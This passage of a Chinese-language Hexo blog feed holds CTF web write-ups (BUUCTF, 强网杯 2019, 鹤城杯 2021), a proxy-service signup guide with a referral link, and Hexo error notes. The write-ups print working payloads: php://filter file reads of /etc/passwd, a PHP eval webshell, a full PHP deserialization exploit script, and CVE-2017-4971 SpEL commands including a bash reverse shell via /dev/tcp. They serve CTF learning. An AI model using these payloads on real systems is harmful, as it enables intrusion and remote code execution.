%&#125;&#123;% endfor %&#125; 加密 1.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23%7E%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96 提交 拿到了flag 总结这道题知识盲区还挺多，做得起还是靠师傅们的wp，做这种题做完后给我一种感觉，就是觉得还是有很多不会的，但是如果都去深入了解一遍，很耽误做题时间，并且意义不大。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RC4加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10分钟实现科学上网]]></title>
    <url>%2F2021%2F10%2F12%2F10%E5%88%86%E9%92%9F%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[前言给大家推荐一个比较实惠的科学上网平台，10RMB/月的套餐100GB流量，可以同时三个人使用（一个终端算一个），反正我自己一个人每个月基本上用不完，windows下支持Clash、Shadowsocks、Netch客户端，MACOS下支持Surge、ClashX、ShadowsocksX，手机就不介绍了，这里我选一个我最常用的客户端Clash 做演示，这个客户端同时支持windows、macos、安卓系统，并且有一个对节点进行测速的功能（经常使用），完美解决了节点不稳定的切换问题。想用其他客户端也可以自己探索，贴个文档https://www-ssrr-pro.gitbook.io/workspace/ 环境windows 10 准备一个GOGOCloud账号(充值10元) Clash for Windows 客户端 官网下载地址 github下载地址 步骤注册账号并登录贴一个我的邀请地址（会获得一元奖励作为初始资金）注册地址 1https://cp.antigfw.net/auth/register?code=U0MM 填写相关信息，注意邮箱不要乱填，找回密码的时候用得着。 注册成功后登录 1https://cp.antigfw.net/auth/login 充值并购买套餐打开后是这么个界面 点击右边充值，充个10块钱。 然后将左边的滚动栏拖到最下面，点击套餐套餐购买。 找到这个套餐购买 里面有个优惠码、订单确认不管它，直接确定。 购买完成后，接下来安装Clash客户端，导入节点，实现科学上网。 下载客户端并导入节点实现科学上网 官网下载地址 打开是这么个界面 接下来返回返回官网，找到 可以在Proxies 界面看到节点的列表 进入General界面，配置System Proxy打开。 配置后任务栏的图标会由蓝色变成米白色。 测试访问Google、Youtube 完成。 如果不明白，可以看官网教程https://www-ssrr-pro.gitbook.io/workspace/windows/clash-for-windows 最后上外网以查资料学习为主，不要在外网发一些不良言论哈。]]></content>
      <categories>
        <category>教程分享</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [HarekazeCTF2019]encode_and_encode 1]]></title>
    <url>%2F2021%2F10%2F10%2F%5BHarekazeCTF2019%5Dencode_and_encode%201%2F</url>
    <content type="text"><![CDATA[考点代码审计（json_decode特性绕过过滤） 前置知识json_decode特性1可以接收Unicode编码后的字符 123456$js = json_decode('&#123;"name": "\u0068\u0065\u006c\u006c\u006f"&#125;');print_r($js);//stdClass Object//(// [name] =&gt; hello//) php伪协议file:// 用于访问文件（绝对路径、相对路径、网络路径） 1http://www.xx.com?file=file:///etc/passswd php:// 访问输入输出流 1http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码） 参数 1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 php://input 12http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt; 注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的 data:// 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 来源：https://www.cnblogs.com/wjrblogs/p/12285202.html 解题过程打开12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting(0);if (isset($_GET['source'])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal '\.\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123; $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = "&lt;p&gt;not found&lt;/p&gt;\n"; &#125;&#125; else &#123; $content = '&lt;p&gt;invalid request&lt;/p&gt;';&#125;// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\&#123;.+\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]); 分析这段代码的有类似与文件读取的功能，通过file_get_contents函数来读取。这个函数可以使用file://、php://filter、data://协议。但是这里有一个函数专门过滤了常用的php伪协议，还有flag字符。 这个函数检测了两次，第一次检测输入的数据$body = file_get_contents(&#39;php://input&#39;);,第二次检测了被读取文件的数据$content = file_get_contents($page);。最后还有一个无关紧要的替换正则。那么怎么才能绕过这两个条件，读取到flag文件呢？ 这道题的解题的一个关键点，json_decode函数的特性，json_decode函数能够接收Unicode编码后的字符 123456$js = json_decode(&apos;&#123;&quot;name&quot;: &quot;\u0068\u0065\u006c\u006c\u006f&quot;&#125;&apos;);print_r($js);//stdClass Object//(// [name] =&gt; hello//) 上面这个if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;]))条件，只对$body进行了检测，并没有对$json检测，所以通过传入Unicode编码后的字符，is_valid就检测不出来。 这里先构造 1file:///etc/passwd 1&#123;&quot;page&quot;:&quot;\u0066\u0069\u006c\u0065\u003a\u002f\u002f\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064&quot;&#125; 回显{&quot;content&quot;:&quot;&lt;p&gt;not found&lt;\/p&gt;\n&quot;},猜测读取的内容当中存在is_valid函数过滤的字符。 这里直接使用php://filter 协议进行base64编码后再输出 1php://filter/read=convert.base64-encode/resource=/etc/passwd 1&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064&quot;&#125; 回显 读取flag直接读取flag 1php://filter/read=convert.base64-encode/resource=/flag 1&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125; 解码 总结这道题如果知道json_decode特性后，还算是一道比较简单的题，学到了。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>json_decode特性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【强网杯】 2019]Upload 1]]></title>
    <url>%2F2021%2F10%2F10%2F%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload%201%2F</url>
    <content type="text"><![CDATA[考点网站备份文件泄露 反序列化（多文件pop链构造） 前置知识魔术方法 12__get 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__call 在对象中调用一个不可访问方法时，__call() 会被调用。 解题过程分析题型打开是这么个界面 注册一个账号登录后，发现一处文件上传。 该尝试的都尝试了，当时卡在这个地方，然后悄悄搂了一眼大佬的博客。 抓包，发现cookie有蹊跷。 1YTo1OntzOjI6IklEIjtpOjQ7czo4OiJ1c2VybmFtZSI7czo1OiJ0ZXN0MSI7czo1OiJlbWFpbCI7czoxMjoidGVzdDFAcXEuY29tIjtzOjg6InBhc3N3b3JkIjtzOjMyOiI1YTEwNWU4YjlkNDBlMTMyOTc4MGQ2MmVhMjI2NWQ4YSI7czozOiJpbWciO3M6Nzk6Ii4uL3VwbG9hZC9iYmYzOTdkN2ZlMGNhZjJhMmIwMWY5OTk3Y2VjYTEwYi8wNjhhZTQwNTIzYTI0YzllZjU0ZWRlZmQzNzVlNTQyZC5wbmciO30%3D 1a:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:5:&quot;test1&quot;;s:5:&quot;email&quot;;s:12:&quot;test1@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;5a105e8b9d40e1329780d62ea2265d8a&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/bbf397d7fe0caf2a2b01f9997ceca10b/068ae40523a24c9ef54edefd375e542d.png&quot;O30%3D Cookie为注册信息序列化后的值。到这有两种思路，第一个就是测试序列化中传入的路径是否存在目录穿越，第二个就是扫网站备份文件。经过测试，第一种不成功。扫目录扫到了www.tar.gz。 代码审计主要的功能点在这四个文件上。 在Index.php中发现了反序列化入口点。 接下来找利用点。在Profile.php 文件中 有一个类Profile，Profile中有一个方法upload_img。代码如下。 123456789101112131415161718192021222324252627282930public function upload_img()&#123; # 控制$this-&gt;checker 设置值为0 则不进入 if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; // 不上传就不执行 if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).".png"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; // 添加文件头 比如GIF89a if(getimagesize($this-&gt;filename_tmp)) &#123; # 利用点 @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img="../upload/$this-&gt;upload_menu/$this-&gt;filename"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125;&#125; 是我太菜了，刚开始自己看了一遍，没看出什么毛病，搂一眼大佬博客，发现利用点为copy，这个 copy(source, dest)将文件从 source拷贝到dest。成功时返回TRUE， 或者在失败时返回FALSE。这里$this-&gt;filename_tmp和$this-&gt;filename 在可控的情况下，可以将上传的有一句话的png格式图片文件拷贝成php后缀的文件。 123$this-&gt;filename_tmp = "shell.png";$this-&gt;filename = "shell.php";copy($this-&gt;filename_tmp,$this-&gt;filename); // 最终得到一个shell.php文件 找到了利用点，接下来，怎么才能执行到这个upload_img方法。 Profile类中发现两个魔术方法 12345678910111213public function __get($name) &#123; return $this-&gt;except[$name]; &#125;public function __call($name, $arguments) &#123; # 这里的 $this-&gt;&#123;$name&#125; 也表示一个属性 $name 表示属性名 # 平时都是 $this-&gt;name 写死 $this-&gt;&#123;$name&#125; 的$name 变量名可控 if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 12__get 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__call 在对象中调用一个不可访问方法时，__call() 会被调用。 在__call 方法中，只需要将$this-&gt;{$this-&gt;{$name}}的中的$this-&gt;{$name}值为upload_img，就能够调用upload_img方法。那要怎么才能触发__call，并且让$this-&gt;{$name}值为upload_img呢？ 在REgister.php文件中。 1234567891011121314151617181920class Register extends Controller&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;checker=new Index(); &#125; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125; Register中的__destruct方法调用了$this-&gt;checker-&gt;index();假设，我们把$this-&gt;checker改成Profile类，那这里的语句就能够触发Profile::__call方法。这样一条链条就形成了。 1Register::__construct()-&gt;Register::__destruct()-&gt;Profile::__call()-&gt;Profile::__get()-&gt;Profile::__call()-&gt;Profile::upload_img()-&gt;copy() Register::__construct()中将$this-&gt;checker指定为new Profile(), Register::__destruct() 会调用Profile类中的index方法，发现找不到，会触发Profile::__call。 1234567891011public function __get($name) &#123; echo $name; return $this-&gt;except[$name]; &#125;public function __call($name, $arguments) &#123; if ($this-&gt;&#123;$name&#125;) &#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 触发Profile::__call,$name的值则为index,当执行到$this-&gt;{$name}发现找不到index这个属性，又会触发__get，__get则会从$this-&gt;except数组中取键名为index的值返回。当我们把$this-&gt;except属性值设置为[&quot;index&quot;=&gt;&quot;upload_img&quot;]，这样在执行$this-&gt;{$this-&gt;{$name}}($arguments);一句时，$this-&gt;{$name}不就是upload_img了吗。然后就会进入到upload_img方法中，接下来只需要修改一些属性值，就能执行到copy($this-&gt;filename_tmp,$this-&gt;filename);。这里怎么利用刚刚已经说过了。 先注册一个账号，上传一个图片格式后缀的一句话木马(加GIF89a),拿到上传路径。 shell.png 12GIF89a&lt;?php eval($_POST[&apos;shell&apos;]);?&gt; 序列化上脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?php namespace app\web\controller;class Register&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;checker; &#125; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;except = ["index"=&gt;"upload_img"]; $this-&gt;ext = 1; $this-&gt;filename_tmp = "../public/upload/bbf397d7fe0caf2a2b01f9997ceca10b/fb5c81ed3a220004b71069645f112867.png"; $this-&gt;filename = "../public/upload/bbf397d7fe0caf2a2b01f9997ceca10b/shell.php"; $this-&gt;checker = 0; $this-&gt;upload_menu = md5($_SERVER['REMOTE_ADDR']); @chdir("../public/upload"); if (!is_dir($this-&gt;upload_menu)) &#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img() &#123; echo "upload_img"; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if (!empty($_FILES)) &#123; $this-&gt;filename_tmp = $_FILES['upload_file']['tmp_name']; $this-&gt;filename = md5($_FILES['upload_file']['name']) . ".png"; $this-&gt;ext_check(); &#125; if ($this-&gt;ext) &#123; if (getimagesize($this-&gt;filename_tmp)) &#123; # 利用点 @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img = "../upload/$this-&gt;upload_menu/$this-&gt;filename"; $this-&gt;update_img(); &#125; else &#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125; else &#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; &#125; public function __get($name) &#123; echo "__get"; echo $name; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; echo "__call"; if ($this-&gt;&#123;$name&#125;) &#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;$r1 = new Register();$p1 = new Profile();$r1-&gt;checker = $p1;echo base64_encode(serialize($r1)); 1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6ODY6Ii4uL3B1YmxpYy91cGxvYWQvYmJmMzk3ZDdmZTBjYWYyYTJiMDFmOTk5N2NlY2ExMGIvZmI1YzgxZWQzYTIyMDAwNGI3MTA2OTY0NWYxMTI4NjcucG5nIjtzOjg6ImZpbGVuYW1lIjtzOjU5OiIuLi9wdWJsaWMvdXBsb2FkL2JiZjM5N2Q3ZmUwY2FmMmEyYjAxZjk5OTdjZWNhMTBiL3NoZWxsLnBocCI7czoxMToidXBsb2FkX21lbnUiO3M6MzI6ImY1Mjg3NjRkNjI0ZGIxMjliMzJjMjFmYmNhMGNiOGQ2IjtzOjM6ImV4dCI7aToxO3M6MzoiaW1nIjtOO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7Tjt9 login_check函数中为反序列化的触发点。 这里的index、home路由都会调用login_check。 提交 总结有意思，有意思，先自己做，做不起悄悄搂一眼大佬博客，在继续做，学到很多。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
        <tag>备份文件泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021CTF鹤城杯挑战赛WEB-wp]]></title>
    <url>%2F2021%2F10%2F09%2F2021CTF%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%8C%91%E6%88%98%E8%B5%9BWEB-wp%2F</url>
    <content type="text"><![CDATA[前言web题总共5道，两道sql注入，两道代码审计，一道考CVE利用。这次比赛环境结束就关闭了，导致有些题目无法复现出来。 比赛复现web-easy_sql 1未找到复现环境 web-easy_sql 2未找到复现环境 题目相关的解题wp https://threezh1.com/2020/12/06/Mysql8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87SELECT%E8%BF%87%E6%BB%A4/ https://anthem-whisper.github.io/p/roarctf-2020/ web-Spring考点CVE-2017-4971 利用 复现过程复现过程 别的师傅已经复现过，再次一步步写没有多大意义，这里就贴几个关键的payload和关键点截图。 验证漏洞 1&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty ![image-20211009113612191](F:\D-学习笔记\CTF WP\image-20211009113612191.png) 执行命令 1&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;) 1&amp;_(new+java.lang.ProcessBuilder(&quot;touch /tmp/success2&quot;)).start()=test 好像没有效果。 反弹shell 1_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub 比赛就是用的上面的payload，能够执行，这里环境限制，不能截图。 注意点：比赛过程中，我抓包放到Repeater 中改数据再发送，没有执行成功，经过大师傅指点，直接抓包，修改数据，Forward，成功。好像是因为cstoken的原因。 web-middle-magic比赛源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phphighlight_file(__FILE__);include "./flag.php";include "./result.php";# aaa的值长度不能大于20if(isset($_GET['aaa']) &amp;&amp; strlen($_GET['aaa']) &lt; 20)&#123; $aaa = preg_replace('/^(.*)level(.*)$/', '$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;', $_GET['aaa']); echo $aaa; # $aaa 要有字符串 pass_the_level_1# if(preg_match('/pass_the_level_1#/', $aaa))&#123; echo "here is level 2"; # admin root_pwd 要定义 if (isset($_POST['admin']) and isset($_POST['root_pwd'])) &#123; # admin root_pwd 不能等于 == if ($_POST['admin'] == $_POST['root_pwd']) echo '&lt;p&gt;The level 2 can not pass!&lt;/p&gt;'; // START FORM PROCESSING // admin root_pwd 要全等于 // 数组绕过? else if (sha1($_POST['admin']) === sha1($_POST['root_pwd']))&#123; echo "here is level 3,do you kown how to overcome it?"; if (isset($_POST['level_3'])) &#123; $level_3 = json_decode($_POST['level_3']); // &#123;"result": 0&#125; if ($level_3-&gt;result == $result) &#123; echo "success:".$flag; &#125; else &#123; echo "you never beat me!"; &#125; &#125; else&#123; echo "out"; &#125; &#125; else&#123; die("no"); &#125; // perform validations on the form data &#125; else&#123; echo '&lt;p&gt;out!&lt;/p&gt;'; &#125; &#125; else&#123; echo 'nonono!'; &#125; echo '&lt;hr&gt;';&#125;?&gt; 这道题考的都是基本知识点的组合，直接贴payload 12?aaa=%0apass_the_level_1%23admin[0]=a&amp;root_pwd[1]=b&amp;level_3=&#123;&quot;result&quot;: 0&#125; web-easycho本地复现：test6.php 123456789101112131415161718192021222324252627&lt;?phpinclude 'utils.php';if (isset($_POST['guess'])) &#123; $guess = (string) $_POST['guess']; if ($guess === $secret) &#123; $message = 'Congratulations! The flag is: ' . $flag; &#125; else &#123; $message = 'Wrong. Try Again'; &#125;&#125;if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) &#123; exit("hacker :)");&#125;# url编码绕过if (preg_match('/show_source/', $_SERVER['REQUEST_URI']))&#123; exit("hacker :)");&#125;if (isset($_GET['show_source'])) &#123; highlight_file(basename($_SERVER['PHP_SELF'])); exit();&#125;else&#123; show_source(__FILE__);&#125;?&gt; 这道题，以前做过一次，这道题在原题的基础上多了个匹配show_source的正则。这个正则只需要url编码即可绕过。 payload 1test6.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65 关键点详细解释 $_SERVER[‘PHP_SELF’] 作用是取当前执行脚本的文件名 像这样 来源http://www.iwonder.run/blog/post/during/3691566f7f15 1234http://www.5idev.com/php/ ：/php/index.phphttp://www.5idev.com/php/index.php ：/php/index.phphttp://www.5idev.com/php/index.php?test=foo ：/php/index.phphttp://www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo $_SERVER[‘REQUEST_URI’] 作用URI 用来指定要访问的页面 1http://localhost:9999/test6.php/utils.php?source =&gt; /test6.php/utils.php?source basename 返回路径中的文件名部分 官方例子 12345678&lt;?phpecho "1) ".basename("/etc/sudoers.d", ".d").PHP_EOL;echo "2) ".basename("/etc/sudoers.d").PHP_EOL;echo "3) ".basename("/etc/passwd").PHP_EOL;echo "4) ".basename("/etc/").PHP_EOL;echo "5) ".basename(".").PHP_EOL;echo "6) ".basename("/");?&gt; 1234561) sudoers2) sudoers.d3) passwd4) etc5) .6) 会输出路径末尾的文件名。 官方文档 1234567891011121314151617181920$path=&apos;/test/äaä.txt&apos;;echo $path.&quot;\n&quot;;setlocale(LC_ALL,&apos;C&apos;);echo dirname($path).&apos;/&apos;.basename($path).&quot;\n&quot;;setlocale(LC_ALL,&apos;en_US.iso885915&apos;); // bash: 语言环境 -aecho dirname($path).&apos;/&apos;.basename($path).&quot;\n&quot;;预期结果：----------------/test/äaä.txt/test/äaä.txt/test/äaä.txt实际结果：--------------/test/äaä.txt/test/aä.txt/test/äaä.txt 这个函数有个小bug，就是遇到非ascii码字符会被丢弃。这就是解题的关键点。所以，我们通过在index.php/utils.php/后面添加一个非ascii码的字符串，这样做可以绕过正则，当执行到basename函数的时候，这个非ascii字符就会被丢弃，就会成功执行utils.php/。 所以构造payload 1test6.php/utils.php/%8e?%73%68%6f%77%5f%73%6f%75%72%63%65]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>SQL注入</tag>
        <tag>CVE利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo问题记录]]></title>
    <url>%2F2021%2F10%2F01%2FHexo%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Hexo常用命令 hexo new [layout] &lt;title&gt; 新建一篇文章 hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public) hexo generate 生成静态文件 hexo server 启动服务器 hexo deploy 部署网站 更多指令 从typora编辑器发布到Hexo需要做那些事情？ 添加头部 更改名字 更改时间 更改标签 替换链接 hexo-next 主题 添加评论功能hexo - Next 主题添加评论功能 Hexo-next 主题 配置版权使用Hexo的next主题，配置POST文章文末的版权信息 Hexo 关闭文章评论Hexo 关闭文章评论 hexo-next设置网站的图标Faviconhexo设置网站的图标Favicon Hexo-NexT 加载性能优化Hexo-NexT 加载性能优化 Hexo 配置图片懒加载图片懒加载 貌似看到没有效果 hexo 部署到 giteeHexo 部署到 Gitee 报错：Code 401: 未经授权的操作，请检查你的AppId和AppKey.配置域名记得在 Leancloud -&gt; 设置 -&gt; 安全中心 -&gt; Web 安全域名 把你的域名加进去。 否则网页会出现 “valine 未经授权的操作，请检查你的AppId和AppKey.” 提示。 hexo g 编译报错错误内容123456789101112131415161718192021222324252627282930313233343536F:\Blog\Blog&gt;hexo gINFO Start processingERROR Process failed: _posts/[0CTF 2016]piapiapia 1.mdYAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 5: date: 2021-10-01 22:32:05 ^ at generateError (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:167:10) at throwError (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:173:9) at readBlockMapping (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1073:9) at composeNode (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1359:12) at readDocument (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1519:3) at loadDocuments (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1575:5) at Object.load (F:\Blog\Blog\node_modules\js-yaml\lib\js-yaml\loader.js:1596:19) at parseYAML (F:\Blog\Blog\node_modules\hexo-front-matter\lib\front_matter.js:80:21) at parse (F:\Blog\Blog\node_modules\hexo-front-matter\lib\front_matter.js:56:12) at F:\Blog\Blog\node_modules\hexo\lib\plugins\processor\post.js:48:20 at tryCatcher (F:\Blog\Blog\node_modules\bluebird\js\release\util.js:16:23) at Promise._settlePromiseFromHandler (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:514:35) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:574:18) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10) at Promise._settlePromises (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:699:18) at Promise._fulfill (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:643:18) at PromiseArray._resolve (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:126:19) at PromiseArray._promiseFulfilled (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:144:14) at PromiseArray._iterate (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:114:31) at PromiseArray.init [as _init] (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:78:10) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:571:21) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10) at Promise._settlePromises (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:699:18) at Promise._fulfill (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:643:18) at PromiseArray._resolve (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:126:19) at PromiseArray._promiseFulfilled (F:\Blog\Blog\node_modules\bluebird\js\release\promise_array.js:144:14) at Promise._settlePromise (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:579:26) at Promise._settlePromise0 (F:\Blog\Blog\node_modules\bluebird\js\release\promise.js:619:10)INFO Files loaded in 953 msINFO 0 files generated in 1.77 s 报错原因标题中出现[] 解决办法使用 大写 【 hexo d 报错1234567891011121314The file will have its original line endings in your working directory[master ec9d510] Site updated: 2021-10-10 21:48:37 2 files changed, 2 insertions(+), 2 deletions(-)ssh: connect to host github.com port 22: Connection refusedfatal: Could not read from remote repository.Please make sure you have the 